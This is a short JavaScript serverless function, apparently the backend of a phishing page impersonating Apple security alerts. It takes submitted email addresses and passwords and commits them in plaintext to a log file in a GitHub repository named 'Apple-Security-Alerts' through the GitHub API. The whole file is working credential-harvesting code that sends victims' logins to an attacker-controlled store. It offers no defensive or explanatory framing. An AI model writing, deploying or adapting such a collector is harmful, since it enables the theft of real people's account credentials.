import { Octokit } from "@octokit/rest";

export default async function handler(req, res) {
  // 1. Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { email, password, timestamp } = req.body;
  
  // 2. Initialize the GitHub Client using your Vercel Environment Variable
  const octokit = new Octokit({ 
    auth: process.env.GH_TOKEN 
  });

  const owner = 'careed23';
  const repo = 'Apple-Security-Alerts';
  const path = 'activity_log.txt';

  try {
    let currentContent = "";
    let sha = undefined;

    // 3. Try to get the existing log file to append to it
    try {
      const { data } = await octokit.repos.getContent({ owner, repo, path });
      currentContent = Buffer.from(data.content, 'base64').toString();
      sha = data.sha;
    } catch (e) {
      // If file doesn't exist yet, we'll create it
      console.log("Creating new log file...");
    }

    // 4. Format the new entry
    const newEntry = `[${timestamp}] EMAIL: ${email} | PASS: ${password}\n`;
    const updatedContent = currentContent + newEntry;

    // 5. Commit the update back to GitHub
    await octokit.repos.createOrUpdateFileContents({
      owner,
      repo,
      path,
      message: `Security Log Update: ${email}`,
      content: Buffer.from(updatedContent).toString('base64'),
      sha: sha // Required for updating existing files
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("GitHub API Error:", error);
    return res.status(500).json({ error: "Failed to sync with GitHub" });
  }
}
